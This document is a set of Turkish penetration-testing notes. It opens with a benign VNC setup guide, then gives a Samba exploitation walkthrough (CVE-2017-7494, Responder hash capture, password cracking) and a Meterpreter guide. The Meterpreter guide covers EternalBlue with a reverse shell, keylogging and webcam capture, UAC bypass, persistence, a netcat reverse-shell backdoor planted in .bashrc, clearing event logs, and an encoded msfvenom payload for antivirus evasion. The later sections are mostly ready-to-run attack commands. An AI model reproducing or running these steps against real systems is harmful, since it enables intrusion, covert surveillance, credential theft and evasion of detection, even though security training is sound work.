📌 RFB (Remote Frame Buffer) protokolünü kullanır ve genellikle TCP 5900 portunda çalışır.
📌 SSH ve VPN gibi güvenli bağlantılarla birlikte kullanılabilir.

### 📌 1. VNC Nasıl Çalışır?
🔹 VNC, bir istemci-sunucu modelinde çalışır:
1️⃣ VNC Server: Uzaktaki bilgisayarda çalışır ve ekran görüntüsünü paylaşır.
2️⃣ VNC Client (Viewer): Kullanıcı, bu istemci aracılığıyla uzak sisteme bağlanır.
3️⃣ RFB protokolü üzerinden görüntü ve fare/klavye komutları aktarılır.
### 📌 Popüler VNC Yazılımları:
✔ RealVNC (Ticari)
✔ TightVNC (Ücretsiz, açık kaynak)
✔ UltraVNC (Windows için)
✔ TigerVNC (Linux için)

### 📌 2. VNC Kurulumu ve Kullanımı
### 📌 Linux’ta VNC Server Kurulumu (TigerVNC):
```bash
sudo apt update && sudo apt install tigervnc-standalone-server
```
### 📌 VNC sunucusunu başlatma:
```bash
vncserver :1
```
### 📌 VNC şifresi belirleme:
```bash
vncpasswd
```
### 📌 VNC sunucusunu durdurma:
```bash
vncserver -kill :1
```
### 📌 Windows’ta VNC Client (Viewer) Kullanımı:
1️⃣ RealVNC veya TightVNC Viewer’ı indirip kurun.
2️⃣ IP ve port (5901 gibi) girerek bağlanın.

### 📌 3. SSH Üzerinden Güvenli VNC Tünelleme
🔹 VNC bağlantıları şifrelenmez, bu yüzden SSH tünelleme ile güvenli hale getirilebilir.
### 📌 SSH ile VNC tünelleme:
```bash
ssh -L 5901:localhost:5901 kullanıcı@uzak_sunucu
```
### 📌 Daha sonra VNC Viewer’a localhost:5901 girerek güvenli bağlantı sağlayabilirsiniz.

### 📌 4. VNC Alternatifleri
🔹 VNC yerine daha güvenli ve modern çözümler:
✔ RDP (Windows Remote Desktop Protocol) → Windows sistemler için daha iyi optimizasyon sağlar.
✔ TeamViewer → Şifreli ve kullanımı kolaydır.
✔ AnyDesk → Hafif ve hızlıdır.
✔ X2Go → SSH tabanlı güvenli uzak masaüstü bağlantısı sunar.

### 🚀 Sonuç
### ✔ VNC, uzaktaki bir bilgisayarı grafiksel arayüz üzerinden yönetmek için kullanılır.
✔ TigerVNC, TightVNC ve RealVNC gibi çeşitli sürümleri vardır.
✔ Güvenli kullanım için SSH tünelleme önerilir.
✔ Alternatif olarak RDP, TeamViewer ve AnyDesk gibi araçlar düşünülebilir.
________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
### 📌 Samba Portuna Manuel Sızma Testi
Samba, Windows ve Linux sistemleri arasında dosya paylaşımı sağlayan bir servistir. 445 ve 139 numaralı TCP portlarında çalışır. Eğer bir sistemde güvenlik açığı bulunan bir Samba sürümü varsa, bu açığı kullanarak manuel olarak istismar edilebilir.

### 📌 1. Açık Portları ve Servisleri Tespit Etme
İlk olarak, hedef sistemde Samba'nın çalışıp çalışmadığını kontrol etmek için Nmap kullanılır:
```bash
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <hedef_IP>
```
Bu komut, Samba sürümünü ve paylaşılan klasörleri listeleyebilir.
### 📌 Daha detaylı tarama yapmak için:
```bash
nmap --script smb-vuln* -p 139,445 <hedef_IP>
```
Bu komut, Samba servisine karşı bilinen zafiyetleri kontrol eder.

### 📌 2. Samba Versiyonunu Kontrol Etme
Hedef sistemde çalışan Samba sürümünü öğrenmek için:
```bash
smbclient -L //<hedef_IP> --no-pass
```
Eğer yetkisiz erişim açıksa, paylaşılan klasörleri görebilirsiniz.
Samba sürümünü doğrudan almak için:
```bash
rpcclient -U "" <hedef_IP>
```
Komut satırı açıldıktan sonra:
```bash
srvinfo
```

### 📌 3. Samba'da Yetkisiz Erişim Testi
Eğer sistem yanlış yapılandırılmışsa, anonim kullanıcılar bazı klasörlere erişebilir.
### 📌 Anonim oturum açmayı test etmek için:
```bash
smbclient //<hedef_IP>/paylasimadi -U ""
```
Eğer giriş yapılıyorsa, listeleme için:
```bash
ls
```
veya dosya indirme:
```bash
get dosya.txt
```

### 📌 4. Zafiyetlerin İstismarı
Bazı Samba sürümleri kritik güvenlik açıklarına sahiptir. Manuel olarak istismar edilebilecek bazı önemli zafiyetler:
🔹 Samba CVE-2017-7494 (Remote Code Execution - RCE)
Samba 3.5.0 ve 4.5.9 arasındaki sürümler bu açıktan etkilenmektedir.
"libpayload.so" adlı bir dosya yükleyerek uzaktan komut çalıştırılabilir.
### 📌 İstismar etmek için: 1️⃣ Kali Linux veya başka bir sistemde aşağıdaki komutu çalıştırarak dosya paylaşımı açılır:
```bash
mkdir /tmp/smbshare
```
echo -ne "\xff\xfe\xfd\xfc" > /tmp/smbshare/libpayload.so
#### 2️⃣ Daha sonra Samba'ya bağlanarak dosyayı hedefe yükleyin:
```bash
smbclient //<hedef_IP>/anonymous -U ""
```
put libpayload.so
#### 3️⃣ Uzaktan komut çalıştırmayı test etmek için:
```bash
smbclient //<hedef_IP>/anonymous -U "" -c 'open /libpayload.so'
```

🔹 Samba Kullanıcı Şifrelerini Ele Geçirme
Eğer Samba servisi düzgün yapılandırılmamışsa, kullanıcı parolaları sızdırılabilir.
### 📌 SMB Hashlerini Ele Geçirme
Windows makinelerden Responder ile SMB hash yakalama:
```bash
sudo responder -I eth0
```
Hedef sistemde bir kullanıcı paylaşılan klasörleri tararken NTLMv2 hashleri elde edilebilir. Bu hashleri John the Ripper veya Hashcat ile kırabilirsiniz.
### 📌 John the Ripper ile hash kırma:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 📌 5. Erişim Sağlandıktan Sonra Ne Yapılabilir?
Eğer Samba servisine başarıyla erişildi ve shell alındıysa:
✔ Sistemde çalışan servisleri ve kullanıcıları kontrol et:
```bash
whoami
```
uname -a
cat /etc/passwd
### ✔ Yetkileri yükseltmek için SUID bit veya sudo yetkilerini kontrol et:
```bash
find / -perm -4000 2>/dev/null
```
Eğer root yetkisi elde edilirse, sistemin tamamı ele geçirilebilir.

### 🚀 Sonuç
### ✔ Samba servisi 445 ve 139 portlarını kullanır.
✔ Nmap ile açık portları ve zafiyetleri tarayabilirsiniz.
✔ Yetkisiz erişim testleri için smbclient ve rpcclient kullanılabilir.
✔ CVE-2017-7494 gibi güvenlik açıkları manuel olarak istismar edilebilir.
✔ Erişim sağlandıktan sonra yetki yükseltme ve sistem kontrolü yapılabilir.
____________________________________________________________________________________________________________________________________________________________________________
### 📌 Meterpreter ile Manuel Sızma Testi
Meterpreter, Metasploit Framework'ün bir bileşeni olup, hedef sistemde sessizce çalışarak gizli ve esnek bir erişim sağlar. Manuel sızma testi yaparken Meterpreter kullanarak sistem üzerinde kontrol sağlayabilir, dosya yönetebilir, ağ taramaları yapabilir ve hatta yetki yükseltebilirsiniz.

### 📌 1. Meterpreter Nedir?
### ✔ Metasploit içinde çalışan bir payload’dır.
✔ Hafızada çalışır, diske yazılmadığı için tespiti zordur.
✔ Dinamik olarak genişletilebilir, ek modüllerle daha fazla yetenek kazanabilir.
✔ TCP, HTTP, HTTPS gibi protokollerle iletişim kurabilir.

### 📌 2. Meterpreter ile Manuel Sızma Aşamaları
🔹 1. Exploit Kullanarak Hedef Sisteme Sızma
Öncelikle hedef sistemin açıklarını tespit etmelisiniz. Bunun için Nmap veya Metasploit kullanılabilir:
```bash
nmap -sV -p 445,139 <hedef_IP>
```
Eğer sistemde SMB veya başka bir serviste açıklık varsa, buna uygun exploitler kullanılabilir.
Metasploit'i başlatın:
```bash
msfconsole
```
Örnek olarak EternalBlue (MS17-010) SMB Exploiti ile saldırı:
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
set RHOSTS <hedef_IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <saldırı_makinesi_IP>
set LPORT 4444
exploit
Eğer başarılı olursa, Meterpreter Shell açılır.

🔹 2. Meterpreter ile Hedef Sistemi Yönetmek
Bağlantının sağlanıp sağlanmadığını kontrol et:
```bash
sysinfo
```
whoami
Bu komutlar hedef sistemin işletim sistemi, sistem adı ve aktif kullanıcıyı gösterir.
### 📌 Dosya Sistemi Yönetimi:
```bash
pwd               # Bulunduğun dizini gösterir
```
ls                # Klasör içeriğini listeler
cd C:\\Users      # Windows’ta dizin değiştirir
download secret.txt  # Dosya indirir
upload backdoor.exe  # Dosya yükler
### 📌 Ağ Bilgilerini Alma:
```bash
ipconfig          # Ağ arayüzlerini gösterir
```
route             # Yönlendirme tablolarını gösterir
netstat -an       # Aktif bağlantıları gösterir
### 📌 Keylogger Çalıştırma (Klavye Dinleme)
```bash
keyscan_start     # Klavye dinlemeye başlar
```
keyscan_dump      # Yakalanan tuş vuruşlarını gösterir
keyscan_stop      # Keylogger'ı durdurur
### 📌 Ekran Görüntüsü Alma:
```bash
screenshot
```
### 📌 Web Kamerasından Görüntü Alma:
```bash
webcam_list       # Kullanılabilir kameraları listeler
```
webcam_snap       # Fotoğraf çeker
webcam_stream     # Kamerayı canlı izlemeye başlar

🔹 3. Yetki Yükseltme (Privilege Escalation)
### 📌 Hangi yetkilerle çalıştığını görmek için:
```bash
getuid
```
### 📌 Sistem yöneticisi (admin/root) yetkisi almak için:
```bash
getsystem
```
Bu komut Windows’ta UAC Bypass yaparak sistem yöneticisi yetkisi kazanmaya çalışır.
### 📌 Alternatif yetki yükseltme yöntemleri:
```bash
use exploit/windows/local/bypassuac
```
set SESSION 1
exploit
### 📌 Linux’ta yetkili kullanıcı olup olmadığını görmek:
```bash
getprivs
```
Eğer root yetkisi alınmışsa, sistemin kontrolü tamamen ele geçirilmiş olur.

🔹 4. Arka Kapı Bırakma (Persistence)
Eğer bağlantının kesilmemesini istiyorsanız, Meterpreter’da kalıcılık sağlamak için aşağıdaki yöntemler kullanılabilir.
### 📌 Windows'ta Arka Kapı Bırakma:
```bash
run persistence -U -i 5 -p 4444 -r <saldırı_makinesi_IP>
```
Bu komut, Windows başladığında tekrar Meterpreter oturumu açmaya çalışır.
### 📌 Linux'ta Arka Kapı Bırakma:
```bash
echo 'nc -e /bin/bash <saldırı_makinesi_IP> 4444' >> ~/.bashrc
```
Bu, her terminal açıldığında saldırgana ters bağlantı sağlayacaktır.

### 📌 3. Meterpreter ile Manuel Sızma Sonrası Güvenlik Açıklarını Gizleme
### ✔ Logları Temizleme:
```bash
clearev
```
### ✔ Antivirüs Bypass İçin Encoding Kullanma:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o backdoor.exe
```
### ✔ Process Injection ile Gizli Çalışma:
```bash
migrate -P explorer.exe
```
Bu işlem Meterpreter’ı explorer.exe içine enjekte ederek tespiti zorlaştırır.


### 🚀 Sonuç
### ✔ Meterpreter, hedef sistemde sessiz ve güçlü bir erişim sağlar.
✔ Sızma sonrası dosya yönetimi, ekran görüntüsü alma, kamera erişimi, keylogger gibi işlemler yapılabilir.
✔ Yetki yükseltme ile sistem yöneticisi hakları elde edilebilir.
✔ Arka kapı bırakılarak kalıcı erişim sağlanabilir.
✔ İz bırakmamak için log temizleme ve antivirüs bypass yöntemleri uygulanabilir.








